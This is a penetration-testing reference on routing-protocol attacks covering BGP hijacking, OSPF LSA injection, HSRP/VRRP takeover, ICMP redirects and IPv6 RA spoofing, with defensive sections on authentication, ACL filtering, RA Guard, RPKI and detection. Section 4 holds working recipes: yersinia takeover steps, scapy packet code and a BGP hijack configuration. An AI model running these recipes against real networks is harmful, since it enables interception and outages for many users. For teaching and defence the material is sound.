# Routing Attacks

Attacks against the protocols that decide where packets go: BGP
between autonomous systems, OSPF/IS-IS inside an enterprise, HSRP/
VRRP for gateway redundancy, ICMP redirects for host routing. All
of these trust their peers more than they should.

> [!CAUTION]
> Routing attacks can black-hole or redirect traffic for thousands
> of hosts. A single forged OSPF LSA or BGP announcement can take a
> network offline or divert it through an attacker-controlled path.
> Only run these against networks you own or have written
> authorization to test, and only in a lab for the first time.

---

## 1. Overview

Routing protocols fall into three groups:

- **EGP (Exterior Gateway Protocols):** BGP carries routes between
  autonomous systems (ASes) on the internet. It trusts announcements
  from peers; there is no cryptographic proof that an AS owns the
  prefix it announces.
- **IGP (Interior Gateway Protocols):** OSPF, IS-IS, EIGRP. They
  flood link-state or distance-vector information inside one AS.
  Authentication is optional and often weak.
- **First-hop redundancy:** HSRP, VRRP, GLBP. Multiple routers share
  a virtual IP. The active router is chosen by priority; an attacker
  can claim a higher priority.
- **Host routing:** ICMP redirects, Router Advertisements (IPv6).
  Hosts accept them without verification.

Every one of these can be abused to redirect traffic through an
attacker, cause a denial of service, or leak topology information.

---

## 2. Reconnaissance / Enumeration

### 2.1 Discover routing protocols in use

```bash
# Passive capture - look for OSPF, EIGRP, HSRP, VRRP, BGP
sudo tcpdump -i eth0 -nn -c 50 'proto 89 or proto 88 or (udp port 1985) or (tcp port 179)'

# OSPF = IP proto 89, EIGRP = IP proto 88
# HSRP = UDP 1985 (v1) / 2029 (v2), VRRP = IP proto 112
# BGP = TCP 179
```

Expected output (OSPF hello):

```text
10.0.0.1 > 224.0.0.5: OSPFv2, Hello, length 44
    Router-ID: 10.0.0.1
    Area: 0.0.0.0
    Hello Interval: 10s
    Dead Interval: 40s
    Neighbor: 10.0.0.2
```

### 2.2 Identify the DR / BDR (OSPF)

In an OSPF broadcast segment, one router is Designated Router (DR)
and one is Backup (BDR). The DR is elected by highest priority, then
highest Router-ID. If you can become the DR, you can inject LSAs that
everyone accepts.

### 2.3 HSRP / VRRP active router

```bash
sudo tcpdump -i eth0 -nn -c 5 'udp port 1985 or proto 112'
```

Expected output (HSRP):

```text
10.0.0.1.1985 > 224.0.0.2.1985: HSRPv1-hello 20
    Group: 10
    Priority: 100
    Active Router: 10.0.0.1
    Standby Router: 10.0.0.2
    Virtual IP: 10.0.0.254
```

The highest priority is the active router (default 100, max 255).

### 2.4 BGP peer discovery (external recon)

```bash
# From outside: use public data
whois -h whois.radb.net ' -i origin AS12345'
# Or query a BGP looking glass (bgp.he.net, routeviews)
```

### 2.5 Router Advertisement (IPv6)

```bash
sudo tcpdump -i eth0 -nn -c 5 'icmp6 and ip6[40] == 134'
```

Expected output:

```text
fe80::1 > ff02::1: ICMP6, router advertisement, length 56
    hop limit 64
    prefix info option (3), length 32: 2001:db8::/64
```

If you see RAs, the network is using SLAAC. You can send your own.

---

## 3. Common Attack Vectors

### 3.1 OSPF LSA injection

Inject forged Link State Advertisements into area 0. Peers accept
them and update their routing tables. The attacker becomes the path
to arbitrary prefixes.

**Preconditions:** the attacker must first form an OSPF adjacency
with a real router (send valid HELLOs with matching area, interval,
and authentication).

### 3.2 OSPF DR takeover

Send HELLOs with priority 255. The current DR steps down, the
attacker becomes DR, and every LSA in the area flows through them.
From there, inject LSAs to redirect traffic.

### 3.3 HSRP / VRRP takeover

Send HSRP HELLOs with priority 255 (or higher than the current
active). The current active router steps down, the attacker becomes
the gateway for the virtual IP. Full MITM for every host using that
virtual IP as gateway.

**Simpler than OSPF:** no adjacency to establish, just a higher
priority. Works within seconds.

### 3.4 BGP hijacking

Announce a prefix that belongs to someone else (or a more specific
prefix of it). Peer routers accept the more specific route and send
traffic to the attacker's AS. This is the attack behind several
high-profile internet outages.

**Preconditions:** control of an AS and a BGP session with at least
one peer. Route origin authorisation (RPKI) is the mitigation, but
adoption is incomplete.

### 3.5 ICMP redirect

Send an ICMP redirect telling the victim to use a different gateway
for a specific destination. If the victim accepts it, traffic for
that destination goes through the attacker.

**Preconditions:** the attacker must be on-path already (or spoof
the legitimate gateway's IP). Modern OSes ignore ICMP redirects by
default on most interfaces.

### 3.6 IPv6 Router Advertisement spoofing

Send a Router Advertisement claiming to be the default gateway.
Hosts using SLAAC configure themselves with the attacker as gateway.
Higher impact than ICMP redirect because it affects all IPv6 hosts
on the segment.

### 3.7 Route table manipulation on a compromised host

If the attacker has code execution on a router or host, they can
modify the routing table directly (`ip route add`, `route add`).
No protocol attack needed. Useful post-exploitation.

---

## 4. Exploitation Recipes

### 4.1 HSRP takeover with yersinia

```bash
sudo yersinia -I
# Press '5' for HSRP
# Choose "taking over the active router"
# Press 'x' to launch
```

Yersinia sends HELLOs with priority 255. The current active router
sees a higher priority and steps down.

Verify with tcpdump - the active router IP should now be yours.

### 4.2 VRRP takeover with yersinia

```bash
sudo yersinia -I
# Press '7' for VRRP
# Choose "taking over the master"
```

Same as HSRP but for VRRP (RFC 5798). VRRP v3 supports
authentication (IPsec AH in some deployments); v2 authentication is
cleartext and trivially spoofed.

### 4.3 OSPF adjacency + LSA injection with scapy

```python
from scapy.all import *
from scapy.contrib.ospf import *

# Step 1: send OSPF Hello to form adjacency
hello = IP(src="10.0.0.66", dst="224.0.0.5") / \
        OSPF_Hdr(src="10.0.0.66", area="0.0.0.0") / \
        OSPF_Hello(hellointerval=10, deadinterval=40,
                   mask="255.255.255.0", priority=255)
send(hello, iface="eth0", loop=1, inter=2)

# Step 2: once adjacency is up, send a forged LSA
# (This is complex - use a dedicated tool like Loki or FRR for lab)
```

For real engagements, use **Loki** (a Python tool for OSPF attacks)
or configure a Linux router with **FRR** and inject routes via OSPF.

### 4.4 ICMP redirect with scapy

```python
from scapy.all import *

# Tell 10.0.0.50 that 10.0.0.100 is reachable via us (10.0.0.66)
pkt = IP(src="10.0.0.1", dst="10.0.0.50") / \
      ICMP(type=5, code=1, gw="10.0.0.66") / \
      IP(src="10.0.0.50", dst="10.0.0.100") / \
      TCP(sport=12345, dport=80)
send(pkt, iface="eth0")
```

Note: this example spoofs the legitimate gateway's source IP. If the
victim accepts the redirect, traffic to 10.0.0.100 flows through the
attacker. Most modern OSes ignore ICMP redirects by default.

### 4.5 IPv6 RA spoofing with radvd or fake_router6

```bash
# Using radvd (legitimate tool, misused)
sudo radvd -C /etc/radvd.conf

# Or with THC-IPv6 toolkit
sudo fake_router6 eth0 2001:db8::/64
```

Hosts receive the RA, configure an IPv6 address, and set the attacker
as default gateway. All IPv6 traffic from those hosts goes through
the attacker.

### 4.6 BGP hijack (conceptual, requires AS)

```text
# On a BGP router you control, announce a prefix you do not own:
router bgp 65001
  network 203.0.113.0/24
!
# Peers accept the announcement unless RPKI or prefix filters
# reject it. The traffic goes to your AS.
```

Do not test this on the public internet. Route origin validation
(RPKI ROA) is the mitigation; in a lab, disable RPKI to demonstrate
the attack.

---

## 5. Post-Exploitation

After a successful routing attack:

- **Full MITM** on all traffic to the affected prefix (HSRP, OSPF,
  ICMP redirect).
- **Denial of service** by black-holing the prefix (BGP hijack with
  a drop route).
- **Traffic capture** with tcpdump on the attacker's interface.
- **Credential capture** from cleartext protocols (see file 01).
- **Chain with ARP spoofing** (file 01) for hosts that do not use
  the affected routing protocol.

For IPv6 RA spoofing, all dual-stack hosts switch their default
gateway to the attacker. Combine with DNS spoofing (file 03) for a
complete IPv6 MITM.

---

## 6. Risk Context (AppSec)

| Factor | Value |
|--------|-------|
| Typical severity | High (HSRP/VRRP) to Critical (BGP hijack) |
| Preconditions | Attacker on-path (IGP) or controls an AS (BGP) |
| Detectability | Medium - routing changes are logged; BGP hijacks are visible |
| Business impact | MITM, DoS, data exfiltration |

Routing attacks are **infrastructure-level**: one attack affects
every host behind the affected router or prefix. The impact scales
with the size of the routing domain.

---

## 7. Root Causes (AppSec)

- OSPF authentication is optional and often MD5 (weak).
- HSRP v1/v2 authentication is cleartext.
- VRRP v2 authentication is cleartext.
- BGP relies on trust between peers; RPKI adoption is ~40% globally.
- ICMP redirects are accepted by default on some OSes.
- IPv6 RAs are accepted without any authentication.
- Router ACLs often do not filter routing protocol traffic at the
  network edge.

---

## 8. Preventive Controls (AppSec)

### 8.1 OSPF authentication

```text
! Cisco IOS - use SHA instead of MD5 where supported
interface GigabitEthernet0/1
 ip ospf authentication message-digest
 ip ospf message-digest-key 1 sha256 <KEY>
!
router ospf 1
 area 0 authentication message-digest
```

### 8.2 HSRP / VRRP authentication + filtering

```text
! HSRP with MD5 (v2)
interface GigabitEthernet0/1
 standby 10 ip 10.0.0.254
 standby 10 priority 110
 standby 10 preempt
 standby 10 authentication md5 key-string <KEY>
!
! VRRP v3 with IPsec AH (or rely on TTL check)
interface GigabitEthernet0/2
 vrrp 20 ip 10.0.0.253
 vrrp 20 priority 110
 vrrp 20 authentication text <KEY>
```

Additionally, filter HSRP/VRRP on access ports:

```text
! Block HSRP, VRRP, OSPF from user ports
interface range GigabitEthernet0/2-24
 no ip redirects
 no ip unreachables
 no ip proxy-arp
 ip access-group BLOCK-ROUTING-PROTOS in
!
ip access-list extended BLOCK-ROUTING-PROTOS
 deny   udp any any eq 1985
 deny   ip any any 112
 deny   ip any any 89
 deny   ip any any 88
 permit ip any any
```

### 8.3 BGP security (RPKI + prefix filters)

- **RPKI ROA:** sign route origin authorisations for your prefixes.
- **Route Origin Validation (ROV):** drop announcements without a
  valid ROA.
- **Prefix filters:** explicitly list which prefixes a peer may
  announce.
- **Max-prefix limits:** cap the number of prefixes per peer.
- **TTL security (GTSM):** require BGP packets to have TTL 255.

```text
router bgp 65001
 neighbor 192.0.2.1 remote-as 65002
 neighbor 192.0.2.1 ttl-security hops 1
 neighbor 192.0.2.1 maximum-prefix 1000
 neighbor 192.0.2.1 prefix-list PEER-IN in
!
ip prefix-list PEER-IN permit 198.51.100.0/24
```

### 8.4 IPv6 RA Guard

```text
! Block RAs from access ports
interface GigabitEthernet0/2
 ipv6 nd raguard attach-policy
```

Or use the global policy:

```text
ipv6 nd raguard policy HOSTS
 device-role host
!
interface range GigabitEthernet0/2-24
 ipv6 nd raguard attach-policy HOSTS
```

### 8.5 Disable ICMP redirects on hosts

```bash
# Linux
sudo sysctl -w net.ipv4.conf.all.accept_redirects=0
sudo sysctl -w net.ipv4.conf.all.send_redirects=0

# Windows (via GPO or registry)
# HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters
#   EnableICMPRedirect = 0
```

### 8.6 Network segmentation

Keep the routing control plane on dedicated links between routers.
Never allow routing protocols on user-facing access ports. This is
the single most effective control.

---

## 9. Detection Controls (AppSec)

### 9.1 Routing protocol anomaly detection

- **OSPF:** new Router-ID in the area, unexpected LSA type 5
  (external routes), topology change storms.
- **HSRP/VRRP:** priority change to 255, new active router MAC.
- **BGP:** new prefix announcement from a peer, AS path length jump,
  sudden withdraw storm.
- **IPv6 RA:** RA from a MAC that is not a known router.

### 9.2 Syslog examples

```text
%OSPF-4-DRCHANGE: DR change on interface Gi0/1
%HSRP-5-STATECHANGE: Standby group 10 state Active -> Speak
%BGP-3-NOTIFICATION: received from neighbor 192.0.2.1
%IPV6_ND-4-RA_GUARD: RA guard policy HOSTS dropped RA on Gi0/2
```

### 9.3 NetFlow / sFlow analysis

- Sudden shift in traffic path for a prefix.
- Traffic to a previously silent next-hop.
- Asymmetric routing that was not there before.

### 9.4 BGP monitoring

- **BGPStream / RouteViews / RIPE RIS:** public BGP feeds.
- Alert on your prefixes appearing with an unexpected origin AS.
- Tools: `bgpalerter`, Cloudflare Radar, MANRS.

### 9.5 SIEM rules

- Alert if HSRP active router changes outside a maintenance window.
- Alert if a router sees a new OSPF neighbor in area 0.
- Alert if an access port sends OSPF/HSRP/VRRP packets.

---

## 10. Verification (AppSec)

Test the controls after deployment:

1. **OSPF auth:** send a Hello without authentication. The router
   should reject it. With MD5/SHA, the neighbor should not form.
2. **HSRP auth:** send a Hello with priority 255 but wrong key. The
   active router should not step down.
3. **RA Guard:** send an RA from a host port. The switch should drop
   it and log a violation.
4. **RPKI:** check your prefixes on a public validator
   (rpki-monitor.antd.nist.gov, RIPE RPKI validator).
5. **ICMP redirect:** send a redirect to a test host. The host
   should ignore it (`sysctl` value on Linux, registry on Windows).
6. **Access-port filtering:** from a user port, send an OSPF Hello.
   The switch should drop it (ACL) and log it.

---

## 11. OSCP Notes

Routing attacks are **not** in the OSCP exam. They are relevant for:

- Real internal engagements where you have Layer 2 or Layer 3 access.
- Cloud environments (VPC route table manipulation if you have
  control-plane access).
- Red team operations against enterprise networks.

For the exam report, focus on the **defensive controls**: routing
protocol authentication, RA Guard, RPKI. These show infrastructure
awareness beyond the standard OSCP scope.

---

## 12. Production Notes

- **Routing attacks are the highest-blast-radius techniques in this
  subcategory.** A single forged HSRP Hello can redirect all traffic
  for a subnet; a BGP hijack can affect millions of users.
- **BGP hijack should never be tested on the public internet.**
  Use a lab AS with no real peering, or a research testbed
  (DETERlab, CloudLab).
- **OSPF adjacency requires matching parameters.** If the area,
  hello interval, dead interval, or authentication do not match,
  the router rejects your Hello. Recon first (see 2.1).
- **HSRP/VRRP takeover is fast and loud.** The legitimate active
  router logs a state change immediately. Use it only when detection
  is acceptable.
- **IPv6 RA spoofing can break dual-stack hosts** (they lose IPv4
  connectivity preference). Have a rollback (send a legitimate RA
  with higher preference, or stop the attack and wait for the
  legitimate RA to expire).

---

## 13. References

- RFC 2328 - OSPF Version 2
- RFC 5340 - OSPF for IPv6
- RFC 4271 - A Border Gateway Protocol 4 (BGP-4)
- RFC 5798 - Virtual Router Redundancy Protocol (VRRP) Version 3
- RFC 2281 - Cisco Hot Standby Router Protocol (HSRP)
- RFC 792 - Internet Control Message Protocol
- RFC 4861 - Neighbor Discovery for IP version 6 (IPv6)
- RFC 6480 - An Infrastructure to Support Secure Internet Routing (RPKI)
- MITRE ATT&CK T1557 - Adversary-in-the-Middle - https://attack.mitre.org/techniques/T1557/
- MITRE ATT&CK T1498 - Network Denial of Service - https://attack.mitre.org/techniques/T1498/
- MANRS - Mutually Agreed Norms for Routing Security (https://manrs.org/)
- NIST SP 800-115 - Technical Guide to Information Security Testing
- Loki - OSPF attack tool (https://github.com/r3nhatt/loki)
- yersinia (https://github.com/tomac/yersinia)
- THC-IPv6 toolkit (https://github.com/vanhauser-thc/thc-ipv6)
